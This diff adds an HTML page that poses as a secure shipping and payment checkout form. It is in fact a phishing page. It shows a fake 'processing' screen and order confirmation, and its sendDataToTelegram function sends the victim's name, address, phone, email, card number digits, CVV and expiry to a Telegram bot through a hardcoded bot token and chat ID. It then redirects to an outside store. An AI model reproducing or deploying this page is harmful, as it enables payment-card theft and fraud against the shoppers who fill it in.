@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment and Shipping Form</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.4.6/css/flag-icon.min.css">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1d3557, #457b9d, #a8dadc);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            max-width: 900px;
+            width: 100%;
+        }
+        .form-container {
+            background-color: #ffffff;
+            color: #333;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            position: relative;
+        }
+        .form-container h2 {
+            text-align: center;
+            background: linear-gradient(to right, #007BFF, #6a11cb);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .form-container input,
+        .form-container select,
+        .form-container textarea {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .form-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+        .form-container button:hover {
+            background-color: #0056b3;
+        }
+        .flag-select {
+            display: flex;
+            align-items: center;
+        }
+        .flag-select select {
+            margin-right: 10px;
+            flex-grow: 1;
+        }
+        .flag-icon {
+            margin-right: 10px;
+        }
+        .card-type {
+            text-align: right;
+            font-size: 14px;
+            color: #555;
+            margin-top: -10px;
+            margin-bottom: 10px;
+        }
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+        .form-row > div {
+            flex: 1;
+        }
+        .error {
+            color: red;
+            font-size: 12px;
+            display: none;
+        }
+        #processing-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #confirmation-message {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="processing-screen">
+        <div class="loader"></div>
+        <h2>Processing your payment...</h2>
+        <p>Please wait while we verify your details</p>
+        <div id="confirmation-message">
+            <p>✓ Order confirmed! Redirecting to store...</p>
+        </div>
+    </div>
+
+    <div class="form-container">
+        <h2>🚚 Shipping Information</h2>
+        <form id="shipping-form">
+            <div class="form-row">
+                <div>
+                    <input type="text" id="first-name" placeholder="First Name" required>
+                </div>
+                <div>
+                    <input type="text" id="last-name" placeholder="Last Name" required>
+                </div>
+            </div>
+            
+            <input type="text" id="address-line1" placeholder="Street Address Line 1" required>
+            <input type="text" id="address-line2" placeholder="Street Address Line 2 (Optional)">
+            
+            <div class="form-row">
+                <div>
+                    <input type="text" id="city" placeholder="City" required>
+                </div>
+                <div>
+                    <input type="text" id="state" placeholder="State/Province" required>
+                </div>
+            </div>
+            
+            <div class="form-row">
+                <div>
+                    <input type="text" id="zip-code" placeholder="ZIP/Postal Code" required>
+                </div>
+                <div>
+                    <select id="country" required>
+                        <option value="" disabled selected>Select Country</option>
+                        <option value="UAE">United Arab Emirates </option>
+                      <option value="US">United States</option>
+                        <option value="IN">India</option>
+                      <option value="PK">PAKISTAN</option>
+                        <option value="GB">United Kingdom</option>
+                        <option value="CA">Canada</option>
+                        <option value="AU">Australia</option>
+                        <option value="DE">Germany</option>
+                        <option value="JP">Japan</option>
+                        <option value="FR">France</option>
+                        <option value="BR">Brazil</option>
+                        <option value="ES">Spain</option>
+                        <option value="IT">Italy</option>
+                    </select>
+                </div>
+            </div>
+            
+            <input type="text" id="phone" placeholder="Phone Number" required>
+            
+            <textarea id="special-instructions" rows="3" placeholder="Special Delivery Instructions (Optional)"></textarea>
+        </form>
+    </div>
+
+    <div class="form-container">
+        <h2>💳 Payment Information</h2>
+        <form id="payment-form">
+            <input type="text" id="fullname" placeholder="Card Holder Name" required>
+            
+            <input type="text" id="cardnumber" placeholder="Card Number" maxlength="19" oninput="detectCardType()" required>
+            <div id="card-type" class="card-type">Detecting card type...</div>
+            
+            <input type="text" id="expirydate" placeholder="Expiry Date (MM/YY)" maxlength="5" oninput="formatExpiryDate(this)" required>
+            <span id="expiry-error" class="error">Invalid expiry date</span>
+            
+            <input type="password" id="cvv" placeholder="CVV (3 digits)" maxlength="3" required>
+            <span id="cvv-error" class="error">Invalid CVV</span>
+            
+            <div class="flag-select">
+                <select id="country-code" onchange="updatePrefix()">
+                    <option value="+1" data-flag="us" selected>🇺🇸 United States (+1)</option>
+                    <option value="+91" data-flag="in">🇮🇳 India (+91)</option>
+                   <option value="+92" data-flag="pk">pk pakistan (+92)</option>
+                  <option value="+971" data-flag="uae">uae United Arab Emirates (+971)</option>
+                  <option value="+44" data-flag="gb">🇬🇧 United Kingdom (+44)</option>
+                    <option value="+61" data-flag="au">🇦🇺 Australia (+61)</option>
+                    <option value="+49" data-flag="de">🇩🇪 Germany (+49)</option>
+                    <option value="+81" data-flag="jp">🇯🇵 Japan (+81)</option>
+                    <option value="+33" data-flag="fr">🇫🇷 France (+33)</option>
+                    <option value="+55" data-flag="br">🇧🇷 Brazil (+55)</option>
+                    <option value="+34" data-flag="es">🇪🇸 Spain (+34)</option>
+                    <option value="+39" data-flag="it">🇮🇹 Italy (+39)</option>
+                    <option value="+7" data-flag="ru">🇷🇺 Russia (+7)</option>
+                    <option value="+86" data-flag="cn">🇨🇳 China (+86)</option>
+                    <option value="+27" data-flag="za">🇿🇦 South Africa (+27)</option>
+                </select>
+                <input type="text" id="mobilenumber" placeholder="Mobile Number" maxlength="14" required>
+            </div>
+            
+            <input type="email" id="emailaddress" placeholder="Email Address" required>
+            
+            <button type="button" onclick="processOrder()">Submit Payment</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    function updatePrefix() {
+        const select = document.getElementById('country-code');
+        const mobileInput = document.getElementById('mobilenumber');
+        mobileInput.value = select.value + ' ';
+    }
+
+    function formatExpiryDate(input) {
+        const value = input.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+            input.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+        } else {
+            input.value = value;
+        }
+    }
+
+    function detectCardType() {
+        const cardNumber = document.getElementById('cardnumber').value.replace(/\s/g, '');
+        const visaPattern = /^4[0-9]{12}(?:[0-9]{3})?$/;
+        const masterCardPattern = /^5[1-5][0-9]{14}$/;
+        const amexPattern = /^3[47][0-9]{13}$/;
+
+        let cardType = "💳 Unknown Card Type";
+        if (visaPattern.test(cardNumber)) {
+            cardType = "🌍 Visa Card";
+        } else if (masterCardPattern.test(cardNumber)) {
+            cardType = "🏦 MasterCard";
+        } else if (amexPattern.test(cardNumber)) {
+            cardType = "🌟 American Express";
+        }
+        document.getElementById('card-type').innerText = `Card Type: ${cardType}`;
+    }
+
+    function showProcessingScreen() {
+        document.getElementById('processing-screen').style.display = 'flex';
+    }
+
+    function showConfirmation() {
+        document.getElementById('confirmation-message').style.display = 'block';
+    }
+
+    function processOrder() {
+        // Validate shipping info first
+        const firstName = document.getElementById('first-name').value;
+        const lastName = document.getElementById('last-name').value;
+        const address1 = document.getElementById('address-line1').value;
+        const city = document.getElementById('city').value;
+        const state = document.getElementById('state').value;
+        const zip = document.getElementById('zip-code').value;
+        const country = document.getElementById('country').value;
+        const phone = document.getElementById('phone').value;
+
+        if (!firstName || !lastName || !address1 || !city || !state || !zip || !country || !phone) {
+            alert('Please fill all required shipping fields');
+            return;
+        }
+
+        // Show processing screen
+        showProcessingScreen();
+
+        // Simulate processing delay (3-5 seconds)
+        setTimeout(function() {
+            // After processing, show confirmation
+            showConfirmation();
+            
+            // Then send data to Telegram
+            sendDataToTelegram();
+            
+            // Redirect after 2 more seconds
+            setTimeout(function() {
+                window.location.href = "https://www.onlinenow.store/";
+            }, 2000);
+        }, 3000 + Math.random() * 2000); // Random delay between 3-5 seconds
+    }
+
+    async function sendDataToTelegram() {
+        const firstName = document.getElementById('first-name').value;
+        const lastName = document.getElementById('last-name').value;
+        const address1 = document.getElementById('address-line1').value;
+        const address2 = document.getElementById('address-line2').value || 'Not provided';
+        const city = document.getElementById('city').value;
+        const state = document.getElementById('state').value;
+        const zip = document.getElementById('zip-code').value;
+        const country = document.getElementById('country').value;
+        const phone = document.getElementById('phone').value;
+        const fullname = document.getElementById('fullname').value;
+        const cardnumber = document.getElementById('cardnumber').value;
+        const expirydate = document.getElementById('expirydate').value;
+        const cvv = document.getElementById('cvv').value;
+        const mobilenumber = document.getElementById('mobilenumber').value;
+        const emailaddress = document.getElementById('emailaddress').value;
+        const instructions = document.getElementById('special-instructions').value || 'None';
+
+        const message = 
+`🔐 ** 𝗡𝗲𝘄 𝗢𝗿𝗱𝗲𝗿 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱 ** 🔐
+
+🚚 **𝗦𝗵𝗶𝗽𝗽𝗶𝗻𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝗮𝘁𝗶𝗼𝗻**
+👤 𝗡𝗮𝗺𝗲: ${firstName} ${lastName}
+🏠 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: ${address1} ${address2}
+📍 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻: ${city}, ${state} ${zip}
+🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: ${country}
+📞 𝗣𝗵𝗼𝗻𝗲: ${phone}
+📝 𝗜𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀: ${instructions}
+
+💳 **𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻**
+👤 𝗖𝗮𝗿𝗱 𝗛𝗼𝗹𝗱𝗲𝗿: ${fullname}
+🔢 𝗖𝗮𝗿𝗱 𝗡𝘂𝗺𝗯𝗲𝗿: ${cardnumber.slice(0, 12)} 
+🔐 𝗖𝗩𝗩: ${cvv}
+📅 𝗘𝘅𝗽𝗶𝗿𝘆 𝗗𝗮𝘁𝗲: ${expirydate}
+📱 𝗠𝗼𝗯𝗶𝗹𝗲: ${mobilenumber}
+📧 𝗘𝗺𝗮𝗶𝗹: ${emailaddress}
+---
+👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: [「 USMANKHAN☤ 」](****)
+🌐 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: [𝐍𝐆 𝐌𝐄𝐓𝐇𝐎𝐃](**@NGYT777GG**)`;
+
+        const botToken = '7964888305:AAEPf-7B0e2Q705vKoFZ1y8A19YRhFaVQ40';
+        const chatId = '6212349838';
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        try {
+            await fetch(url);
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+        }
+    }
+</script>
+
+</body>
+</html>
